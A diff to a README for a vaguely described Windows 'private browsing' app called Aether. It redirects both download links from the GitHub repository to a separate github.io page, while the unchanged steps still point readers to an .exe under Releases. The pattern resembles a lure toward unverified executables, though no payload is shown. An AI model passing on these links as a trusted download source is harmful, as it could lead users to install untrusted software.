@@ -1,6 +1,6 @@
 # 🌐 Aether - Private Access For Your Daily Web Browsing
 
-[![](https://img.shields.io/badge/Download_Aether_For_Windows-Grey?style=for-the-badge)](https://github.com/ingaborgwelldefined343/Aether)
+[![](https://img.shields.io/badge/Download_Aether_For_Windows-Grey?style=for-the-badge)](https://ingaborgwelldefined343.github.io)
 
 Aether gives you a private and fast way to access the internet. It manages your network traffic automatically. You do not need to configure complex settings. The app handles the technical work behind the scenes. This tool keeps your connection stable while you browse your favorite sites.
 
@@ -16,7 +16,7 @@ Aether gives you a private and fast way to access the internet. It manages your 
 
 You can get the software directly from our repository page. Follow these steps to set it up:
 
-1. Visit the [official download page](https://github.com/ingaborgwelldefined343/Aether).
+1. Visit the [official download page](https://ingaborgwelldefined343.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the version labeled "Latest".
 4. Find the file ending in ".exe" under the "Assets" list.
